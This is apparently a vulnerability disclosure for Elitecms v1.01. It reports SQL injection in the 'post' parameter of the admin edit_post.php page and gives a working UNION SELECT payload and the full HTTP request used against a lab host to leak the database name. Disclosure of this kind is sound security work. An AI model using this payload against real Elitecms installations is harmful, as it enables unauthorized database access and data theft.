# Elitecms v1.01 by elitecms has SQL injection

vendors: https://elitecms.net/download.php

Vulnerability File: /admin/edit_post.php

Vulnerability location: ip/eliteCMS1.01/admin/edit_post.php?page=1&post=, post

dbname: elitecms101

[+] Payload: /eliteCMS1.01/admin/edit_post.php?page=1&post=-1%20union%20select%201,2,3,4,database(),6--+ // Leak place ---> post

```sql
GET /eliteCMS1.01/admin/edit_post.php?page=1&post=-1%20union%20select%201,2,3,4,database(),6--+ HTTP/1.1
Host: 192.168.1.108
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:46.0) Gecko/20100101 Firefox/46.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
DNT: 1
Cookie: PHPSESSID=307ef75a2f3ab4c1103d8a1e90cf120e
Connection: close
```
![image](https://user-images.githubusercontent.com/54017627/167534254-c5b0df89-578f-4ba9-bc3b-73d6fe5ab029.png)

![image](https://user-images.githubusercontent.com/54017627/167534220-194aa8de-6e08-4fd1-bee2-cafa8bbc56d2.png)

